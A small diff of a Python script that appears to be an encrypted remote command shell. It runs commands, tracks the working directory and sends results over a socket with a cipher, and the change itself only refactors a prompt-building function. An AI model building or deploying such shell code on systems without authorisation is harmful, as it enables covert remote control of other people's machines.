@@ -55,8 +55,8 @@ def run(s):
   else:
     return err.decode()
 
-def res(ret):
-  global cwd
+def res():
+  global cwd, ret
   if ret == '':
     return cwd + '>'
   else:
@@ -99,4 +99,4 @@ while True:
       except Exception as e:
         ret = str(e) + ' ⚠️'
 
-    Send(sock, cipher, res(ret))
+    Send(sock, cipher, res())
